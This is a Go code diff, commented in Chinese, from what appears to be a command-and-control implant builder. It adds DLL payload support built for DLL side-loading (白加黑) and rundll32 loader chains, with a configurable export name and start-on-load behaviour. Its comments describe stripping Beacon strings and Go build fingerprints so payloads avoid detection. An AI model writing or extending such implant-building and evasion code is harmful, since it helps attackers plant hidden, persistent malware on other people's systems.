@@ -77,6 +77,10 @@ type BuildOptions struct {
 	// 关闭时载荷里不含任何 Beacon* 符号/字符串（实测这是 full 档案里唯一剩下的
 	// 高信号明文），需要用 BOF 时再开。
 	BofEnabled bool `json:"bof_enabled"`
+	// DLL 载荷（format=dll）：导出函数名（供 rundll32 调用，空 = Start）与"加载即启动"。
+	// 白加黑场景宿主不一定调用我们的导出函数，所以默认加载即启动（见 dll.go）。
+	DLLExport    string `json:"dll_export"`
+	DLLAutoStart bool   `json:"dll_autostart"`
 }
 
 type BuildResult struct {
@@ -624,50 +628,20 @@ func (b *Builder) compileLibrary(opts BuildOptions) ([]byte, error) {
 		return nil, fmt.Errorf("failed to process templates: %v", err)
 	}
 
-	libFile := filepath.Join(tmpDir, "lib.go")
-	libCode := b.generateLibraryCode(targetOS)
-	if err := os.WriteFile(libFile, []byte(libCode), 0644); err != nil {
-		return nil, err
-	}
-
-	lib, err := b.compileGoCode(tmpDir, targetOS, arch, false, "tcp", "full", false, false)
+	// 真正的 DLL（c-shared + mingw），见 dll.go：
+	// v1.3.5 及以前这里是普通 go build（CGO_ENABLED=0），`import "C"` 的胶水会被 Go
+	// 静默跳过，产物其实是"改了扩展名的 EXE"（无 IMAGE_FILE_DLL、无导出表），
+	// 白加黑/rundll32 加载器链根本用不了。
+	exportName, err := ValidateDLLExport(opts.DLLExport)
 	if err != nil {
 		return nil, err
 	}
-	// DLL 载荷同样擦除 Go 构建期指纹（与 exe 路径一致：只置零、长度不变）
-	if scrubbed, removed := ScrubGoFingerprint(lib); len(removed) > 0 {
-		lib = scrubbed
-		logging.Info("builder", "go fingerprint scrubbed (lib): %s", strings.Join(removed, "；"))
-	}
-	return lib, nil
+	return b.compileSharedLibrary(tmpDir, targetOS, arch, opts, exportName, opts.DLLAutoStart)
 }
 
-func (b *Builder) generateLibraryCode(targetOS string) string {
-	if targetOS == "windows" {
-		return `package main
-
-import "C"
-
-//export DllMain
-func DllMain() {
-}
-
-func main() {
-}
-`
-	}
-	return `package main
-
-import "C"
-
-//export Init
-func Init() {
-}
-
-func main() {
-}
-`
-}
+// 说明：旧的 generateLibraryCode（生成 `//export DllMain {}` + 空 main 的假 DLL 胶水）
+// 已删除 —— 它在 CGO_ENABLED=0 下会被 Go 静默跳过，让 `format=dll` 产出"改了扩展名的 EXE"。
+// 现在 DLL 由 dll.go 的 generateDLLGlue 生成（c-shared + 加载即启动 + 可配置导出名）。
 
 func (b *Builder) copyImplantSource(tmpDir, targetOS string) error {
 	return filepath.WalkDir(b.implantDir, func(path string, d fs.DirEntry, err error) error {
